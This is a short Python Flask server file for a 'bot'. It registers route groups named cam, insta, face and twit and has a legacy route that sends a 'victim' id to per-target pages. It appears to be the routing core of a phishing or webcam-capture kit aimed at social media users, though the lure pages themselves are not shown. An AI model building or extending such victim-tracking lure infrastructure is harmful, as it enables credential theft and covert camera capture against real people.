from flask import Flask, redirect, request
from bot.servers import (
    register_cam_routes,
    register_insta_routes,
    register_face_routes,
    register_twit_routes
)

app = Flask(__name__)

# ========== REGISTER ALL ROUTES ==========
register_cam_routes(app)
register_insta_routes(app)
register_face_routes(app)
register_twit_routes(app)

# ========== HOME ==========
@app.route('/')
def home():
    return "✅ Bot is running!"

# ========== LEGACY ROUTE (for backward compatibility) ==========
@app.route('/p/<uid>')
def legacy_page(uid):
    target_type = request.args.get('type', 'cam')
    victim_id = request.args.get('v', 'unknown')

    if target_type == 'cam':
        return redirect(f"/p/cam/{uid}?v={victim_id}")
    elif target_type == 'ig':
        return redirect(f"/p/ig/{uid}?v={victim_id}")
    elif target_type == 'face':
        return redirect(f"/p/face/{uid}?v={victim_id}")
    elif target_type == 'twit':
        return redirect(f"/p/twit/{uid}?v={victim_id}")
    
    return "Page not found", 404

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)
